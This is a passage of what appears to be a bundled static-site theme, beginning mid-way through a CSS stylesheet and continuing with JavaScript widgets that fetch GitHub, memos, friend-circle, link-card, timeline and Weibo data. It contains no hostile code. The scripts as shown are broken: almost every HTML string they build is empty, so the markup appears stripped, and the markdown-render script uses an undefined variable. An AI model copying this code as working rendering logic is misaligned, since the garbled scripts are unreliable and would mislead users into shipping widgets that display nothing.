0.5rem; min-width: 280px; flex: 1; overflow: hidden; word-wrap: break-word; } @media screen and (min-width: 950px) { .post-list .post-card.wiki article .excerpt { margin-right: 2rem; } } .post-list .post-card.wiki article .excerpt .caps { line-height: 1; margin-bottom: 0.75rem; } .post-list .post-card.wiki article .excerpt .cap { --theme-block: var(--block); background: var(--theme-block); padding: 2px 4px; border-radius: 2px; } .post-list .post-card.wiki article .excerpt p:last-child { margin-bottom: 0; } .post-list .post-card.wiki article .excerpt .cap+.cap { margin-left: 4px; } @media screen and (max-width: 500px) { .post-list.archives { margin: 1rem 0; } } .l_main { position: relative; padding-bottom: var(--gap-max); } @media screen and (min-width: 667px) { .l_main { padding-top: 8px; } } .l_main header { margin: 2rem 1rem 1rem; } .l_main header .logo-wrap { margin: 0; } @media screen and (max-width: 667px) { .l_body.index .l_main { padding-top: 0; } } body>.sitebg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-size: cover; } body>.sitebg .siteblur { width: 100%; height: 100%; background: var(--blur-bg); --blur-px: 100px; --blur-bg: var(--alpha75); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { body>.sitebg .siteblur { background: var(--blur-bg) !important; backdrop-filter: saturate(200%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(200%) blur(var(--blur-px)); } } body>.sitebg .siteblur:hover { background: var(--card); } .md-text { max-width: 100%; padding: 1rem; color: var(--text-p1); line-height: 1.6; word-break: break-word; } .md-text.excerpt p { font-size: 0.875rem; margin: 1em 0; } .md-text.content { position: relative; padding-top: 0; padding-bottom: 2rem; overflow: hidden; } .l_body[text-indent] .md-text.content p:not([class]) { text-indent: calc(var(--fsp) * 2); text-align: justify; } .l_body[text-indent] .md-text.content p:not([class]) a { text-indent: 0; } .l_body[text-indent] .md-text.content ol, .l_body[text-indent] .md-text.content ul { margin-left: 0.5em; } .l_body[text-indent] .md-text.content h1, .l_body[text-indent] .md-text.content h2, .l_body[text-indent] .md-text.content h3, .l_body[text-indent] .md-text.content h4, .l_body[text-indent] .md-text.content h5, .l_body[text-indent] .md-text.content h6 { text-align: center; } .l_body[text-indent] .md-text.content h1 >a:first-child, .l_body[text-indent] .md-text.content h2 >a:first-child, .l_body[text-indent] .md-text.content h3 >a:first-child, .l_body[text-indent] .md-text.content h4 >a:first-child, .l_body[text-indent] .md-text.content h5 >a:first-child, .l_body[text-indent] .md-text.content h6 >a:first-child { display: none; } .l_body[text-indent] .md-text.content h2 { margin: 2em 0 1.5em; } .l_body[text-indent] .md-text.content blockquote p:not([class]), .l_body[text-indent] .md-text.content .poetry p:not([class]), .l_body[text-indent] .md-text.content .okr p:not([class]), .l_body[text-indent] .md-text.content .timeline p:not([class]), .l_body[text-indent] .md-text.content li p:not([class]), .l_body[text-indent] .md-text.content .article-footer p:not([class]) { text-indent: 0; text-align: left; } .md-text ul:not(:last-child), .md-text ol:not(:last-child) { padding-bottom: 0.5rem; margin: 0; } .md-text blockquote p, .md-text ul p, .md-text ol p, .md-text blockquote ul, .md-text ul ul, .md-text ol ul, .md-text blockquote ol, .md-text ul ol, .md-text ol ol { --fsp: calc(17px - 1px); font-size: var(--fsp); line-height: 1.5; } .md-text blockquote p code, .md-text ul p code, .md-text ol p code, .md-text blockquote ul code, .md-text ul ul code, .md-text ol ul code, .md-text blockquote ol code, .md-text ul ol code, .md-text ol ol code { font-size: inherit; padding: 0; background: none; } .md-text p *, .md-text blockquote *, .md-text .tag-plugin *, .md-text ul *, .md-text ol *, .md-text .highlight *, .md-text table * { --gap-p: var(--gap-p-compact); } .md-text p, .md-text ul, .md-text ol { margin-top: calc(var(--gap-p) - 4px); margin-bottom: calc(var(--gap-p) - 4px); } .md-text .tag-plugin, .md-text iframe { margin-top: var(--gap-p); margin-bottom: var(--gap-p); } .md-text iframe { display: block; } .md-text.content h1, .md-text.content h2, .md-text.content h3, .md-text.content h4, .md-text.content h5, .md-text.content h6 { color: var(--text); line-height: 1.8; } .md-text.content h1 >a:first-child, .md-text.content h2 >a:first-child, .md-text.content h3 >a:first-child, .md-text.content h4 >a:first-child, .md-text.content h5 >a:first-child, .md-text.content h6 >a:first-child { background: #1cd0fd; border-radius: 2px; margin-right: 8px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .md-text.content h1 >a:first-child:hover, .md-text.content h2 >a:first-child:hover, .md-text.content h3 >a:first-child:hover, .md-text.content h4 >a:first-child:hover, .md-text.content h5 >a:first-child:hover, .md-text.content h6 >a:first-child:hover { background: #ff5724; } .md-text.content h1 >a:first-child:before, .md-text.content h2 >a:first-child:before, .md-text.content h3 >a:first-child:before, .md-text.content h4 >a:first-child:before, .md-text.content h5 >a:first-child:before, .md-text.content h6 >a:first-child:before { content: ''; color: #fff; font-weight: 700; padding: 0 2px; font-size: 0.75rem; } .md-text.content h2 { font-weight: 500; } .md-text.content h2 >a:first-child:before { content: ':'; } .md-text.content blockquote h2, .md-text.content .tag-plugin h2, .md-text.content blockquote h3, .md-text.content .tag-plugin h3, .md-text.content blockquote h4, .md-text.content .tag-plugin h4, .md-text.content blockquote h5, .md-text.content .tag-plugin h5, .md-text.content blockquote h6, .md-text.content .tag-plugin h6 { margin-top: 0.25em; margin-bottom: 0.25em; } .md-text.content:first-child .tag-plugin:first-child { margin-top: 0; } .md-text p { font-size: var(--fsp); } .md-text pre { -webkit-font-smoothing: auto; -moz-osx-font-smoothing: auto; } .md-text pre.mermaid { overflow: auto; } .md-text .center { align-self: center; } .md-text>div { margin: var(--gap-p) 0; } .md-text img { border-radius: 12px; margin: auto; display: block; } li:not([class]) a:not([class]), p:not([class]) a:not([class]), table a:not([class]) { position: relative; text-decoration: none; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; padding: 0 2px; border-radius: 0; color: inherit; background: linear-gradient(0deg, var(--theme-link), var(--theme-link)) no-repeat left 100%/100% 1px; } li:not([class]) a:not([class]):hover, p:not([class]) a:not([class]):hover, table a:not([class]):hover { text-decoration: none; color: var(--theme-link); border-radius: 4px; background: linear-gradient(0deg, var(--theme-link-opa), var(--theme-link-opa)) no-repeat left 100%/100% 100%; } li:not([class]) a:not([class]):has(img), p:not([class]) a:not([class]):has(img), table a:not([class]):has(img) { background: none; padding: 0; } li:not([class]) a:not([class]):has(img):hover, p:not([class]) a:not([class]):has(img):hover, table a:not([class]):has(img):hover { background: none; } .md-text .aplayer { border-radius: 12px; } img.lazy { transition: all 0.38s ease-out; -moz-transition: all 0.38s ease-out; -webkit-transition: all 0.38s ease-out; -o-transition: all 0.38s ease-out; } img.lazy:not(.loaded) { opacity: 0; } img.lazy.loaded, img.lazy.error { opacity: 1; } :root { --swiper-theme-color: #1cd0fd !important; } .swiper { width: 100%; border-radius: 4px; --gap-p: 2rem; } .swiper:not(.swiper-initialized) { display: none; } div.swiper-slide { text-align: center; display: -webkit-box; display: -ms-flexbox; display: -webkit-flex; display: flex; align-self: center; -webkit-box-pack: center; -ms-flex-pack: center; -webkit-justify-content: center; justify-content: center; -webkit-box-align: center; -ms-flex-align: center; -webkit-align-items: center; align-items: center; width: 50%; } div.swiper-slide img { border-radius: 4px; } .swiper[width='max'] .swiper-slide { width: 100%; } .swiper[width='min'] .swiper-slide { width: 25%; } .swiper[effect='cards'] .swiper-slide { max-width: 75%; } .swiper-button-prev, .swiper-button-next { padding: 1rem 0.25rem; margin-top: -2rem !important; border-radius: 40px; background: rgba(255,255,255,0.25); transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; --swiper-theme-color: var(--text) !important; } .swiper-button-prev:after, .swiper-button-next:after { font-size: 1.2rem !important; font-weight: 700 !important; color: var(--swiper-theme-color); } .swiper-button-prev:hover, .swiper-button-next:hover { background: #fff !important; --swiper-theme-color: #ff5724 !important; } .swiper-button-prev:after { transform: translateX(-1px); } .swiper-button-next:after { transform: translateX(1px); } img[data-fancybox], a[data-fancybox] { cursor: zoom-in; } .highlight { position: relative; } .highlight .code .copy-btn { position: absolute; top: 0; right: 0; padding: 0px 0.5rem; font-weight: 700; visibility: hidden; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; background: var(--card); display: block; cursor: pointer; margin-right: 4px; margin-top: 4px; border-radius: calc(12px - 4px); } .highlight:hover .code:before { visibility: hidden; } .highlight:hover .copy-btn { visibility: visible; } .highlight .code .copy-btn.success { background: #3dc550; color: #fff; visibility: visible; } .highlight .code .copy-btn.warning { background: #fa6400; color: #fff; visibility: visible; } .md-text .folding[child=codeblock] .code .copy-btn { z-index: 1; margin-right: 1rem; border-radius: 8px; }"},{"path":"/assets/js/services/ghinfo.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-ghinfo'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } // layout utils.request(null, api, function(data) { function fill(data) { for (let key of Object.keys(data)) { $(el).find(\"[type=text]#\" + key).text(data[key]); $(el).find(\"[type=link]#\" + key).attr(\"href\", data[key]); $(el).find(\"[type=img]#\" + key).attr(\"src\", data[key]); } } const idx = el.getAttribute('index'); if (idx != undefined) { const arr = data.content || data; if (arr && arr.length > idx) { let obj = arr[idx]; obj['latest-tag-name'] = obj['name']; fill(arr[idx]); } } else { fill(data); } }); } }); });"},{"path":"/assets/js/services/memos.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-memos'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = el.getAttribute('avatar') || def.avatar; const limit = el.getAttribute('limit'); const host = api.replace(/https:\\/\\/(.*?)\\/(.*)/i, '$1'); // layout utils.request(el, api, function(data) { var users = []; const filter = el.getAttribute('user'); if (filter && filter.length > 0) { users = filter.split(\",\"); } var hide = []; const hideStr = el.getAttribute('hide'); if (hideStr && hideStr.length > 0) { hide = hideStr.split(\",\"); } data.forEach((item, i) => { if (limit && i >= limit) { return; } if (item.user && item.user.login && users.length > 0) { if (!users.includes(item.user.login)) { return; } } let date = new Date(item.createdTs * 1000) var cell = ''; cell += ''; if (!users.length && !hide.includes('user')) { cell += ''; if (default_avatar.length > 0) { cell += ``; } cell += '' + item.creatorName + ''; cell += ''; } cell += '' + date.toLocaleString() + ''; cell += ''; cell += ''; cell += marked.parse(item.content || ''); var imgs = []; for (let res of item.resourceList) { if (res.type?.includes('image/')) { imgs.push(res); } } if (imgs.length > 0) { cell += ''; for (let img of imgs) { if (img.externalLink?.length > 0) { cell += ``; } else { cell += ``; } } cell += ''; } cell += ''; cell += ''; $(el).append(cell); }); }); } }); });"},{"path":"/assets/js/services/fcircle.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-fcircle'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = def.avatar; // layout utils.request(el, api, function(data) { const arr = data.article_data || []; const limit = el.getAttribute('limit'); arr.forEach((item, i) => { if (limit && i >= limit) { return; } var cell = ''; cell += ''; cell += ''; cell += ''; cell += '' + item.author + ''; cell += ''; cell += '' + item.created + ''; cell += ''; cell += ''; cell += item.title; cell += ''; cell += ''; $(el).append(cell); }); }); } }); });"},{"path":"/assets/js/services/siteinfo.js","content":"// 本插件由CardLink定制而成，原项目源码: https://github.com/Lete114/CardLink function setCardLink(nodes) { // If the `nodes` do not contain a `forEach` method, then the default `a[cardlink]` is used nodes = 'forEach' in (nodes || {}) ? nodes : document.querySelectorAll('a[cardlink]') nodes.forEach((el) => { // If it is not a tag element then it is not processed if (el.nodeType !== 1) return; el.removeAttribute('cardlink'); const api = el.getAttribute('api'); if (api == null) return; fetch(api).then(function(response) { if (response.ok) { return response.json(); } throw new Error('Network response was not ok.'); }).then(function(data) { var autofill = []; const autofillStr = el.getAttribute('autofill'); if (autofillStr) { autofill = autofillStr.split(','); } if (data.title && data.title.length > 0 && autofill.includes('title')) { el.querySelector('.title').innerHTML = data.title; el.title = data.title; } if (data.icon && data.icon.length > 0 && autofill.includes('icon')) { el.querySelector('.img').style = 'background-image: url(\"' + data.icon + '\");'; el.querySelector('.img').setAttribute('data-bg', data.icon); } let desc = el.querySelector('.desc'); if (desc && data.desc && data.desc.length > 0 && autofill.includes('desc')) { desc.innerHTML = data.desc; } }).catch(function(error) { console.error(error); }); }) }"},{"path":"/assets/js/services/mdrender.js","content":"utils.jq(() => { const els = document.getElementsByClassName('ds-mdrender'); for (var i = 0; i < els.length; i++) { const el = els[i]; const src = `${el.getAttribute('src')}?t=${new Date().getTime()}`; utils.request(el, src, function(data) { el.innerHTML = marked.parse(resp.data); }); } });"},{"path":"/assets/js/services/sites.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-sites'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = def.avatar; const default_cover = def.cover; // layout utils.request(el, api, function(data) { for (let item of data.content) { var cell = ``; cell += ``; cell += ``; cell += ``; cell += ``; cell += `${item.title}`; cell += `${item.description || item.url}`; cell += ``; cell += ``; cell += ``; $(el).find('.grid-box').append(cell); } }); } }); });"},{"path":"/assets/js/services/timeline.js","content":"utils.jq(() => { $(function () { const reactions = { '+1': '👍', '-1': '👎', 'laugh': '😀', 'hooray': '🎉', 'confused': '😕', 'heart': '❤️', 'rocket': '🚀', 'eyes': '👀' } const timelines = document.getElementsByClassName('ds-timeline'); for (var i = 0; i < timelines.length; i++) { const el = timelines[i]; const api = el.getAttribute('api'); if (api == null) { continue; } // layout utils.request(el, api, function(data) { const query = new URL(api).search; const arr = data.content || data; var users = []; const filter = el.getAttribute('user'); if (filter && filter.length > 0) { users = filter.split(\",\"); } var hide = []; const hideStr = el.getAttribute('hide'); if (hideStr && hideStr.length > 0) { hide = hideStr.split(\",\"); } arr.forEach((item, i) => { if (item.user && item.user.login && users.length > 0) { if (!users.includes(item.user.login)) { return; } } var cell = ''; cell += ''; if (!users.length && item.user && !hide.includes('user')) { cell += ''; cell += ''; cell += '' + item.user.login + ''; cell += ''; } let date = new Date(item.created_at); cell += '' + date.toLocaleString() + ''; cell += ''; cell += ''; if (!hide.includes('title')) { cell += ''; cell += ''; cell += item.title || item.name || item.tag_name; cell += ''; cell += ''; } cell += marked.parse(item.body || ''); if (!hide.includes('footer')) { cell += ''; cell += ''; if (item.labels) { item.labels.forEach((label, i) => { if (!query || !query.includes(encodeURI(label.name))) { cell += ''; cell += '' + label.name + ''; cell += ''; } }); } else if (item.zipball_url) { cell += ''; cell += '📦 ' + item.tag_name + '.zip'; cell += ''; } cell += ''; cell += ''; if (item.reactions?.total_count > 0) { for (let key of Object.keys(reactions)) { let num = item.reactions[key]; if (num > 0) { cell += ''; cell += '' + reactions[key] + ' ' + item.reactions[key] + ''; cell += ''; } } } if (item.comments != null) { cell += ''; cell += ' ' + (item.comments || 0) + ''; cell += ''; } cell += ''; cell += ''; } cell += ''; cell += ''; $(el).append(cell); }); }); } }); });"},{"path":"/assets/js/services/weibo.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-weibo'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = el.getAttribute('avatar') || def.avatar; // layout utils.request(el, api, function(data) { const arr = data.tweets || []; const limit = el.getAttribute('limit'); arr.forEach((item, i) => { if (limit && i >= limit) { return; } var cell = ''; cell += ''; cell += ''; cell += ''; cell += '' + data.user.nick_name + ''; cell += ''; cell += '' + item.created_at + ''; cell += ''; cell += ''; cell += ''; cell += item.content; cell += ''; // cell += ''; // 每条微博的右下角 转发 评论 点赞 cell += ''; cell += ''; cell += ''; cell += ''; cell += ''; cell += ''; cell += '' + '🔗' + ' ' + item.reposts_count + ''; cell += ''; cell += ''; cell += ''; cell += ' ' + (item.comments_count || 0) + ''; cell += ''; cell += ''; cell += ''; cell += '' + '👍' + ' ' + item.attitudes_count + ''; cell += ''; cell += ''; cell += ''; cell += ''; // 右下角结束 $(el).append(cell); }); }); } }); });"}]